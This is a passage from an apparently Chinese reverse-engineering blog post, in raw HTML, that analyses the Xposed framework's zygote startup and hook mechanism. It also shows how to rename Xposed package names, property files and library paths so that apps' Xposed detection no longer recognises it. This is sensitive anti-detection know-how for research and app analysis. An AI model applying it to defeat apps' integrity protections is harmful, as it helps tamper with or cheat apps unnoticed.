class=\"line\">endif</span><br></pre></td></tr></table></figure>\n\n<p>程序通过判断<code>SDK</code>的版本选择加载文件，这里我们是在Android 6.0上运行，SDK版本为23，因此<code>app_process</code>会执行<code>app_main2.cpp</code>和<code>ART.mk</code></p>\n<p>为了方便我们分析，这里我画了一个思维导图方便大家结合后面源码分析：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/18.png\" alt=\"image-20211003145325591\"></p>\n<p>我们再分析app_main2.cpp中main函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* <span class=\"type\">const</span> argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xposed::handleOptions(argc, argv))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//代码省略...</span></span><br><span class=\"line\">    runtime.mParentDir = parentDir;</span><br><span class=\"line\">    <span class=\"comment\">// 初始化xposed，主要是将jar包添加至Classpath中</span></span><br><span class=\"line\">    isXposedLoaded = xposed::initialize(zygote, startSystemServer, className, argc, argv);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (zygote) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 如果xposed初始化成功，将zygoteInit 替换为 de.robv.android.xposed.XposedBridge，然后创建虚拟机</span></span><br><span class=\"line\">        runtime.start(isXposedLoaded ? XPOSED_CLASS_DOTS_ZYGOTE : <span class=\"string\">&quot;com.android.internal.os.ZygoteInit&quot;</span>,</span><br><span class=\"line\">                startSystemServer ? <span class=\"string\">&quot;start-system-server&quot;</span> : <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">main函数主要做了两件事：</span><br><span class=\"line\">(<span class=\"number\">1</span>)初始化xposed</span><br><span class=\"line\">(<span class=\"number\">2</span>)创建虚拟机</span><br></pre></td></tr></table></figure>\n\n<p><strong>初始化xposed：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">bool <span class=\"title function_\">initialize</span><span class=\"params\">(bool zygote, bool startSystemServer, const <span class=\"type\">char</span>* className, <span class=\"type\">int</span> argc, <span class=\"type\">char</span>* const argv[])</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 初始化xposed的相关变量</span></span><br><span class=\"line\">    xposed-&gt;zygote = zygote;</span><br><span class=\"line\">    xposed-&gt;startSystemServer = startSystemServer;</span><br><span class=\"line\">    xposed-&gt;startClassName = className;</span><br><span class=\"line\">    xposed-&gt;xposedVersionInt = xposedVersionInt;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 打印 release、sdk、manufacturer、model、rom、fingerprint、platform相关数据</span></span><br><span class=\"line\">    printRomInfo();</span><br><span class=\"line\">    <span class=\"comment\">// 主要在于将jar包加入Classpath</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> addJarToClasspath();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）初始化xposed内相关变量</span><br><span class=\"line\">（<span class=\"number\">2</span>）调用addJarToClasspath将XposedBridge.jar添加至系统目录</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建虚拟机：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> AndroidRuntime::start(const <span class=\"type\">char</span>* className, const Vector&lt;String8&gt;&amp; options)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* start the virtual machine */</span></span><br><span class=\"line\">    JniInvocation jni_invocation;</span><br><span class=\"line\">    jni_invocation.Init(NULL);</span><br><span class=\"line\">    JNIEnv* env;</span><br><span class=\"line\">    <span class=\"comment\">//创建虚拟机</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (startVm(&amp;mJavaVM, &amp;env) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 初始化虚拟机，xposed对虚拟机进行修改</span></span><br><span class=\"line\">    onVmCreated(env);</span><br><span class=\"line\">    <span class=\"comment\">// 虚拟机初始化完成后，会调用传入的de.robv.android.xposed.XposedBridge类，初始化java层XposedBridge.jar</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* slashClassName = toSlashClassName(className);</span><br><span class=\"line\">    <span class=\"type\">jclass</span> <span class=\"variable\">startClass</span> <span class=\"operator\">=</span> env-&gt;FindClass(slashClassName);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (startClass == NULL) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">jmethodID</span> <span class=\"variable\">startMeth</span> <span class=\"operator\">=</span> env-&gt;GetStaticMethodID(startClass, <span class=\"string\">&quot;main&quot;</span>,</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）创建虚拟机</span><br><span class=\"line\">（<span class=\"number\">2</span>）初始化虚拟机xposed对虚拟机进行修改, onVmCreated(env)</span><br><span class=\"line\">（<span class=\"number\">3</span>）传入调用类de.robv.android.xposed.XposedBridge</span><br><span class=\"line\">（<span class=\"number\">4</span>）初始化XposedBridge</span><br></pre></td></tr></table></figure>\n\n<p>这里我们可以参考<a href=\"https://blog.csdn.net/luoshengyang/article/details/8885792\">老罗的源码分析</a>:</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/13.png\" alt=\"image-20211003140514072\"></p>\n<p>我们可以发现，我们在初始化虚拟机后，xposed会对虚拟机修改，函数<code>onVmCreated(env)</code></p>\n<p><strong>onVmCreated(env):</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">onVmCreated</span><span class=\"params\">(JNIEnv* env)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Determine the currently active runtime</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!determineRuntime(&amp;xposedLibPath)) </span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// Load the suitable libxposed_*.so for it 通过dlopen加载libxposed_art.so</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span>* xposedLibHandle = dlopen(xposedLibPath, RTLD_NOW);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// Initialize the library  初始化xposed相关库</span></span><br><span class=\"line\">    bool (*xposedInitLib)(XposedShared* shared) = NULL;</span><br><span class=\"line\">    *(<span class=\"keyword\">void</span> **) (&amp;xposedInitLib) = dlsym(xposedLibHandle, <span class=\"string\">&quot;xposedInitLib&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!xposedInitLib)  &#123;</span><br><span class=\"line\">        ALOGE(<span class=\"string\">&quot;Could not find function xposedInitLib&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// xposedInitLib -&gt; onVmCreatedCommon -&gt; initXposedBridge -&gt; 注册Xposed相关Native方法</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (xposedInitLib(xposed)) &#123;</span><br><span class=\"line\">        xposed-&gt;onVmCreated(env);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们来分析<code>xposedInitLib</code></p>\n<p>libxposed_art.cpp#xposedInitLib</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/14.png\" alt=\"image-20211003142331938\"></p>\n<p>libxposed_common.cpp#onVmCreatedCommon</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/15.png\" alt=\"image-20211003142641730\"></p>\n<p>libxposed_common.cpp#initXposedBridge</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/16.png\" alt=\"image-20211003143129911\"></p>\n<p><strong>libxposed_art.cpp#onVmCreated</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/17.png\" alt=\"image-20211003143243869\"></p>\n<p>onVmCreated总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）通过dlopen加载libxposed_art.so</span><br><span class=\"line\">（<span class=\"number\">2</span>）初始化xposed相关库 xposedInitLib</span><br><span class=\"line\">（<span class=\"number\">3</span>）xposedInitLib-&gt;onVmCreatedCommon-&gt;initXposedBridge，初始化XposedBridge，将register_natives_XposedBridge中的函数注册为Native方法</span><br><span class=\"line\">（<span class=\"number\">4</span>）xposedInitLib-&gt;onVmCreatedCommon-&gt;onVmCreated，为xposed_callback_class与xposed_callback_method赋值</span><br></pre></td></tr></table></figure>\n\n<p><strong>de.robv.android.xposed.XposedBridge#main</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Initialize the Xposed framework and modules</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!hadInitErrors()) &#123;</span><br><span class=\"line\">                initXResources();</span><br><span class=\"line\">                SELinuxHelper.initOnce();</span><br><span class=\"line\">                SELinuxHelper.initForProcess(<span class=\"literal\">null</span>);</span><br><span class=\"line\">                runtime = getRuntime();</span><br><span class=\"line\">                XPOSED_BRIDGE_VERSION = getXposedVersion();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (isZygote) &#123;</span><br><span class=\"line\">                    XposedInit.hookResources();</span><br><span class=\"line\">                    XposedInit.initForZygote();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                XposedInit.loadModules();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                Log.e(TAG, <span class=\"string\">&quot;Not initializing Xposed because of previous errors&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">        <span class=\"comment\">// Call the original startup code</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isZygote) &#123;</span><br><span class=\"line\">            ZygoteInit.main(args);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            RuntimeInit.main(args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>源码分析：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">虚拟机初始化完成后，会调用传入的de.robv.android.xposed.XposedBridge类，初始化java层XposedBridge.jar，调用main函数</span><br><span class=\"line\">（<span class=\"number\">1</span>）hook 系统资源相关的方法   XposedInit.hookResources()</span><br><span class=\"line\">（<span class=\"number\">2</span>）hook zygote 的相关方法   XposedInit.initForZygote()</span><br><span class=\"line\">（<span class=\"number\">3</span>）加载系统中已经安装的xposed 模块   XposedInit.loadModules()</span><br></pre></td></tr></table></figure>\n\n<p>到此Xposed初始化结束</p>\n<h3 id=\"2-Xposed-hook原理\"><a href=\"#2-Xposed-hook原理\" class=\"headerlink\" title=\"2. Xposed hook原理\"></a>2. Xposed hook原理</h3><p>通过上文的详细分析，我们可以得出Xposed的hook原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Xposed的基本原理是修改了ART/Davilk虚拟机，将需要hook的函数注册为Native层函数。当执行到这一函数是虚拟机会优先执行Native层函数，然后再去执行Java层函数，这样完成函数的hook</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/19.png\" alt=\"image-20211003145926728\"></p>\n<p>启动过程总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）手机启动时init进程会启动zygote这个进程。由于zygote进程文件app_process已被替换，所以启动的时Xposed版的zygote进程</span><br><span class=\"line\">（<span class=\"number\">2</span>）Xposed_zygote进程启动后会初始化一些so文件（system/lib system/lib64），然后进入XposedBridge.jar中的XposedBridge.main中初始化jar包完成对一些关键Android系统函数的hook</span><br><span class=\"line\">（<span class=\"number\">3</span>）Hook则是利用修改过的虚拟机将函数注册为<span class=\"keyword\">native</span>函数</span><br><span class=\"line\">（<span class=\"number\">4</span>）然后再返回zygote中完成原本zygote需要做的工作</span><br></pre></td></tr></table></figure>\n\n<p>我们对Xposed的基本原理和hook原理就基本掌握了，大家都知道我们这使用Xposed时，需要不断的去重启手机和勾选我们安装的模块，为了方便使用，这里补充两个技巧，我们了解Xposed源码后，就可以很方便实现了</p>\n<h4 id=\"（1）取消重启手机\"><a href=\"#（1）取消重启手机\" class=\"headerlink\" title=\"（1）取消重启手机\"></a>（1）取消重启手机</h4><p>我们先观察上文XposedBridge中main</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/20.png\" alt=\"image-20211003150826842\"></p>\n<p>上面的XposedInit.loadModules()这个函数，这个函数的作用就是load hook模块到进程中，因为zygote启动时先跑到java层XposeBridge.main中，在main里面有一步操作是将hook模块load进来，模块加载到zygote进程中，zygote fork所有的app进程里面也有这个hook模块，所以这个模块可以hook任意app。</p>\n<p>编写hook模块的第一步就是判断当前的进程名字，如果是要hook的进程就hook，不是则返回，所以修改模块后，要将模块重新load zygote里面必须重启zygote，要想zygote重启就要重启手机了。</p>\n<p>解决办法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">所以修改的逻辑是不把模块load到zygote里面，而是load到自己想要hook的进程里面，这样修改模块后只需重启该进程即可</span><br></pre></td></tr></table></figure>\n\n<p>步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）将上面XposedInit.loadModules()注释掉即可</span><br><span class=\"line\">（2）在2处修改代码</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isZygote) &#123;</span><br><span class=\"line\">      XposedHelpers.findAndHookMethod(<span class=\"string\">&quot;com.android.internal.os.ZygoteConnection&quot;</span>, BOOTCLASSLOADER, <span class=\"string\">&quot;handleChildProc&quot;</span>,</span><br><span class=\"line\">              <span class=\"string\">&quot;com.android.internal.os.ZygoteConnection.Arguments&quot;</span>,FileDescriptor[].class,FileDescriptor.class,</span><br><span class=\"line\">              PrintStream.class,<span class=\"keyword\">new</span> <span class=\"title class_\">XC_MethodHook</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                  <span class=\"meta\">@Override</span></span><br><span class=\"line\">                  <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                      <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">                      <span class=\"built_in\">super</span>.afterHookedMethod(param);</span><br><span class=\"line\">                      <span class=\"type\">String</span> <span class=\"variable\">processName</span> <span class=\"operator\">=</span> (String) XposedHelpers.getObjectField(param.args[<span class=\"number\">0</span>], <span class=\"string\">&quot;niceName&quot;</span>);</span><br><span class=\"line\">                      <span class=\"type\">String</span> <span class=\"variable\">coperationAppName</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;指定进程名称如：com.android.settings&quot;</span>;</span><br><span class=\"line\">                      <span class=\"keyword\">if</span>(processName != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                          <span class=\"keyword\">if</span>(processName.startsWith(coperationAppName))&#123;</span><br><span class=\"line\">                              log(<span class=\"string\">&quot;--------Begin Load Module-------&quot;</span>);</span><br><span class=\"line\">                              XposedInit.loadModules();</span><br><span class=\"line\">                          &#125;</span><br><span class=\"line\">                      &#125;</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\">      ZygoteInit.main(args);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      RuntimeInit.main(args);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们只需要将我们的模块进程指定，这样就不用每次开机都重启那</p>\n<h4 id=\"（2）取消操作Installer-APP\"><a href=\"#（2）取消操作Installer-APP\" class=\"headerlink\" title=\"（2）取消操作Installer APP\"></a>（2）取消操作Installer APP</h4><p>通过阅读源码，我们发现读Install App的源码发现其实勾选hook模块其实app就是把模块的apk位置写到一个文件里，等load模块时会读取这个文件，从这个文件中的apk路径下把apk load到进程中</p>\n<p><strong>loadmodules的源码：</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/21.png\" alt=\"image-20211003152312993\"></p>\n<p>apk配置文件就是installer app文件路径下的<code>conf/modules.list</code>这个文件<code>data/data/de.robv.android.xposed.installer/conf/modules.list</code><br> 或者<code>data/user_de/0/de.robv.android.xposed.installer/conf/modules.list</code></p>\n<p>所以我们勾选一个文件，实际是将其写到<code>conf/modules.list</code>文件下，此时我们发现Xposed中还有一个方法<code>loadModule</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/22.png\" alt=\"image-20211003152549464\"></p>\n<p>这个方法可以根据具体的路径和类加载器，直接导入模块，所以只要我们在上面代码中修改一些，就可以直接导入，不需要勾选那，我们确定apk路径:<code>pathclass = &quot;/data/local/tmp/module.apk&quot;</code>和类加载器为根类加载器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isZygote) &#123;</span><br><span class=\"line\">         XposedHelpers.findAndHookMethod(<span class=\"string\">&quot;com.android.internal.os.ZygoteConnection&quot;</span>, BOOTCLASSLOADER, <span class=\"string\">&quot;handleChildProc&quot;</span>,</span><br><span class=\"line\">                 <span class=\"string\">&quot;com.android.internal.os.ZygoteConnection.Arguments&quot;</span>,FileDescriptor[].class,FileDescriptor.class,</span><br><span class=\"line\">                 PrintStream.class,<span class=\"keyword\">new</span> <span class=\"title class_\">XC_MethodHook</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                     <span class=\"meta\">@Override</span></span><br><span class=\"line\">                     <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">                         <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">                         <span class=\"built_in\">super</span>.afterHookedMethod(param);</span><br><span class=\"line\">                         <span class=\"type\">String</span> <span class=\"variable\">processName</span> <span class=\"operator\">=</span> (String) XposedHelpers.getObjectField(param.args[<span class=\"number\">0</span>], <span class=\"string\">&quot;niceName&quot;</span>);</span><br><span class=\"line\">                         <span class=\"type\">String</span> <span class=\"variable\">coperationAppName</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;指定进程名称如：com.android.settings&quot;</span>;</span><br><span class=\"line\">                         <span class=\"keyword\">if</span>(processName != <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                             <span class=\"keyword\">if</span>(processName.startsWith(coperationAppName))&#123;</span><br><span class=\"line\">                                 log(<span class=\"string\">&quot;--------Begin Load Module-------&quot;</span>);</span><br><span class=\"line\">                                 <span class=\"type\">String</span> <span class=\"variable\">pathclass</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/data/local/tmp/module.apk&quot;</span>;</span><br><span class=\"line\">                                 <span class=\"comment\">//注意这里是loadModule方法,类加载器是我们的根类加载器</span></span><br><span class=\"line\">                                 XposedInit.loadModule(pathclass,BOOTCLASSLOADER);</span><br><span class=\"line\">                             &#125;</span><br><span class=\"line\">                         &#125;</span><br><span class=\"line\">                     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                 &#125;);</span><br><span class=\"line\">         ZygoteInit.main(args);</span><br><span class=\"line\">     &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">         RuntimeInit.main(args);</span><br><span class=\"line\">     &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Xposed框架特征\"><a href=\"#四、Xposed框架特征\" class=\"headerlink\" title=\"四、Xposed框架特征\"></a>四、Xposed框架特征</h2><p>本节参考世界美景大佬<a href=\"https://bbs.pediy.com/thread-255836.htm\">定制Xposed框架</a>和肉丝大佬<a href=\"https://mp.weixin.qq.com/s/YAMCrQSi0LFJGNIwB9qHDA\">来自高纬的对抗：魔改XPOSED过框架检测(下)</a>，经过我们上文的Android运行机制和Xposed框架运行机制讲解，相信大家对Xposed的框架已经有了进一步的认识，这样我们再来看这篇帖子里的修改的特征，就显得十分清晰了</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/23.png\" alt=\"image-20211003152549464\"></p>\n<h2 id=\"五、Xposed特征修改\"><a href=\"#五、Xposed特征修改\" class=\"headerlink\" title=\"五、Xposed特征修改\"></a>五、Xposed特征修改</h2><h3 id=\"1-XposedInstaller\"><a href=\"#1-XposedInstaller\" class=\"headerlink\" title=\"1. XposedInstaller\"></a>1. XposedInstaller</h3><p>我们下载XposedInstaller的工程代码加载到AndroidStudio中，让XposedInstaller配置环境，错误提示解决见上文<a href=\"https://bbs.pediy.com/thread-269616.htm\">源码编译（2）——Xopsed源码编译详解</a></p>\n<p>修改点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）修改整体包名</span><br><span class=\"line\">（2）修改xposed.prop</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（1）修改整体包名\"><a href=\"#（1）修改整体包名\" class=\"headerlink\" title=\"（1）修改整体包名\"></a>（1）修改整体包名</h4><p>先来改下整体的包名，首先将目录折叠给取消掉</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/24.png\" alt=\"image-20211003152549464\"></p>\n<p>然后我们在包名路径中，将xposed改成xppsed，这样可以保证包名长度是一样，同时xposed特征消失不见，选择Refactor→Rename</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/25.png\" alt=\"image-20211003152549464\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/26.png\" alt=\"image-20211003152549464\"></p>\n<p>我们直接点击Refactor，就可以替换成功，点击Preview，则需要再点击 Do Refactor </p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/27.png\" alt=\"image-20211003152549464\"></p>\n<p>这时候我们可以发现程序下的包名都改变了</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/28.png\" alt=\"image-20211003152549464\"></p>\n<p>接下来就是在整个项目的根文件夹下，进行整体的包名替换，因为还有很多编译配置、或者路径配置等等，需要进行包名的更换</p>\n<p>在app文件夹右击，选择Replace in Path</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/29.png\" alt=\"image-20211003152549464\"></p>\n<p>把所有的<code>de.robv.android.xposed.installe</code>都改成<code>de.robv.android.xpsed.installer</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/30.png\" alt=\"image-20211003152549464\"></p>\n<p>搜出来匹配的地方只有5个文件中合计的7处地方，并不多，直接replace All替换即可</p>\n<h4 id=\"（2）xposed-prop改成xpsed-prop\"><a href=\"#（2）xposed-prop改成xpsed-prop\" class=\"headerlink\" title=\"（2）xposed.prop改成xpsed.prop\"></a>（2）<code>xposed.prop</code>改成<code>xpsed.prop</code></h4><p>就是把如下图处的<code>xposed.prop</code>改成<code>xppsed.prop</code>即可</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/31.png\" alt=\"image-20211003152549464\"></p>\n<p>接下来就是编译了。编译时先Build→Clean一下，然后再Build→Make Project，这样就直接编译通过了。可以连接到手机，刷到手机上去，App会被装在手机上，但是无法自动启动，得手动点开</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/59.png\" alt=\"image-20211003174013862\"></p>\n<h3 id=\"2-XposedBridge\"><a href=\"#2-XposedBridge\" class=\"headerlink\" title=\"2. XposedBridge\"></a>2. XposedBridge</h3><h4 id=\"（1）修改整体包名-1\"><a href=\"#（1）修改整体包名-1\" class=\"headerlink\" title=\"（1）修改整体包名\"></a>（1）修改整体包名</h4><p>首先是改包名，方法与上文一模一样，也是首先将xposed进行重构，改成xppsed</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/32.png\" alt=\"image-20211003152549464\"></p>\n<p>注：我们发现很多类型需要手动修改包名，我们依次将包名修改，这里我们发现重构后没反应，很可能是Android Studio的问题，换一个版本或重启</p>\n<p>然后也是一样的在项目根目录下，执行Replace in Path，将所有的<code>de.robv.android.xposed.installer</code>都改成<code>de.robv.android.xppsed.installer</code></p>\n<p>这里就修改完成</p>\n<h4 id=\"（2）生成文件\"><a href=\"#（2）生成文件\" class=\"headerlink\" title=\"（2）生成文件\"></a>（2）生成文件</h4><p><strong>XposedBridge.jar:</strong></p>\n<p>先Make Clean一下，然后编译，将编译出来的文件复制一份，命名为XppsedBridge.jar即可</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/33.png\" alt=\"image-20211003152549464\"></p>\n<p><strong>api.jar:</strong></p>\n<p>然后我们在Gradle-&gt;others-&gt;generate API中生成api.jar，保存在build&#x2F;api下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/34.png\" alt=\"image-20211003152549464\"></p>\n<h3 id=\"3-Xposed\"><a href=\"#3-Xposed\" class=\"headerlink\" title=\"3. Xposed\"></a>3. Xposed</h3><p>Xposed中的文件需要修改的地方不少：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/35.png\" alt=\"image-20211003152549464\"></p>\n<h4 id=\"（1）libxposed-common-h\"><a href=\"#（1）libxposed-common-h\" class=\"headerlink\" title=\"（1）libxposed_common.h\"></a>（1）libxposed_common.h</h4><p>修改之前：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/36.png\" alt=\"image-20211003152549464\"></p>\n<p>修改之后：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/37.png\" alt=\"image-20211003152549464\"></p>\n<h4 id=\"（2）Xposed-h\"><a href=\"#（2）Xposed-h\" class=\"headerlink\" title=\"（2）Xposed.h\"></a>（2）Xposed.h</h4><p>修改之前：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#define XPOSED_PROP_FILE <span class=\"string\">&quot;/system/xposed.prop&quot;</span></span><br><span class=\"line\">#define XPOSED_LIB_ART XPOSED_LIB_DIR <span class=\"string\">&quot;libxposed_art.so&quot;</span></span><br><span class=\"line\">#define XPOSED_JAR <span class=\"string\">&quot;/system/framework/XposedBridge.jar&quot;</span></span><br><span class=\"line\">#define XPOSED_CLASS_DOTS_ZYGOTE <span class=\"string\">&quot;de.robv.android.xposed.XposedBridge&quot;</span></span><br><span class=\"line\">#define XPOSED_CLASS_DOTS_TOOLS <span class=\"string\">&quot;de.robv.android.xposed.XposedBridge$ToolEntryPoint&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>修改之后：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#define XPOSED_PROP_FILE <span class=\"string\">&quot;/system/xppsed.prop&quot;</span></span><br><span class=\"line\">#define XPOSED_LIB_ART XPOSED_LIB_DIR <span class=\"string\">&quot;libxppsed_art.so&quot;</span></span><br><span class=\"line\">#define XPOSED_JAR <span class=\"string\">&quot;/system/framework/XppsedBridge.jar“</span></span><br><span class=\"line\"><span class=\"string\">#define XPOSED_CLASS_DOTS_ZYGOTE &quot;</span>de.robv.android.xppsed.XposedBridge<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">#define XPOSED_CLASS_DOTS_TOOLS &quot;</span>de.robv.android.xppsed.XposedBridge$ToolEntryPoint<span class=\"string\">&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/38.png\" alt=\"image-20211003152549464\"></p>\n<h4 id=\"（3）xposed-service-cpp\"><a href=\"#（3）xposed-service-cpp\" class=\"headerlink\" title=\"（3）xposed_service.cpp\"></a>（3）xposed_service.cpp</h4><p>修改之前：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span 